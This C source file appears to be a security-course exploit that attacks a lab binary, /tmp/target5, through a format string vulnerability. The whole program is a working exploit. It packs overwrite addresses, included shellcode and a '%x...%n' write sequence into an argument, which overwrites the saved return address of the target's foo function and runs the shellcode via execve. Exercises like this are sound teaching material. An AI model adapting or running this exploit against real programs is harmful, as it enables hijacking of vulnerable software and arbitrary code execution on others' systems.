#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"
#define EGG_SIZE 400 

/* 
 * Main idea of exploit:
 *     This is a vanilla format string exploit. 
 *     This exploit follows the guidelines set 
 *     in the "Exploiting Format String Vulnerabilities"
 *     paper by scut / team teso. Basically, we control
 *     the format string for a snprintf call, which we use
 *     to overwrite the saved eip of foo to point to our 
 *     shellcode. 
 */

int main(void)
{
  char *args[3];
  char *env[1];
  char egg[EGG_SIZE];
  char *dummyAddrPair;
  char *writeStr;

  /*  As explained at the end of Section 3.4 of scut's paper 
   *  we need a stackpop sequence, a dummy-addr-pair, and a 
   *  write-code sequence for the format string. These are laid
   *  out here as follows:
   *  - dummyAddrPair: specifies the addresses (plus some
   *    dummy addresses) used by snprintf to write to 
   *    upon reading a %n format directive. 
   *  - writeStr: contains first a 'stackpop' sequence to increase
   *    snprintf's internal stack pointer to point to the beggining
   *    of the buffer. It then contains the format string that
   *    actually does the writing to memory.
   */
  dummyAddrPair = "\xFF\xFF\xFF\xFF\xCC\xFD\xFF\xBF\xFF\xFF\xFF\xFF\xCD\xFD\xFF\xBF\xFF\xFF\xFF\xFF\xCE\xFD\xFF\xBF\xFF\xFF\xFF\xFF\xCF\xFD\xFF\xBF";
  writeStr = "%x%x%x%250x%n%164x%n%259x%n%192x%n";

  memset (egg, 0, sizeof (egg));  
  memcpy (egg, dummyAddrPair, strlen (dummyAddrPair));
  memcpy (egg + strlen (dummyAddrPair), shellcode, strlen (shellcode));
  memcpy (egg + strlen (dummyAddrPair) + strlen (shellcode), writeStr, strlen (writeStr));

  args[0] = TARGET; args[1] = egg; args[2] = NULL;
  env[0] = NULL;  

  if (0 > execve (TARGET, args, env))
    fprintf (stderr, "execve failed.\n");

  return 0;
}
